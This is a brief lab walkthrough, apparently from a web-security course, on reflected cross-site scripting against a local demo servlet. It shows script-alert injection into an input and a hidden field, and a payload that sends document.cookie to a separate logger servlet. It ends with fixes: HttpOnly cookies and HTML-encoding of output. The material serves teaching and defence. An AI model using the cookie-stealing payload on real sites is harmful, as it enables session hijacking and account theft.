Reflected Cross-Site Scripting
---------------------------------------------------------------------

Browser: https://localhost:8443/Servlet-XSS/index.html
		 

How to attack an input field?
---------------------------------------------------------------------

a) Use FireBug to change the maxlength attribute of the input field
	username (becuase username will be embedded in the response page).	

b) Enter <script>alert('XSS');</script> as the username and submit.


How to attack a hidden field?
---------------------------------------------------------------------
a) Use FireBug to change the value of the hidden field named role to:
	<script>alert('XSS');</script>

b) Fill in some more user data and submit.

	
How to Steal cookies?
---------------------------------------------------------------------

a) Deploy Servlet-Logger

b) Displaying cookies
	<script>alert(document.cookie);</script>

c) Stealing cookies
	<script>document.location="http://localhost:8080/Servlet-Logger/controller?cookie="+document.cookie+"&location="+document.location;</script>

Note that this attack can also be used to steal session ids!!


How to fix these vulnerabilities?
---------------------------------------------------------------------

o) Set the cookie flags:
       Cookie cookie = new Cookie("id",Base64.encodeBase64String("1234567890".getBytes()));
       cookie.setHttpOnly(true);  //!!!!
       response.addCookie(cookie);


o) In ControllerServlet.generateUserPage(): 
   change
		html.append(username).append(" as ");
		html.append(role);

   to
		html.append(HTMLEncoder.encodeForHTML(username)).append(" as ");
		html.append(HTMLEncoder.encodeForHTML(role));

		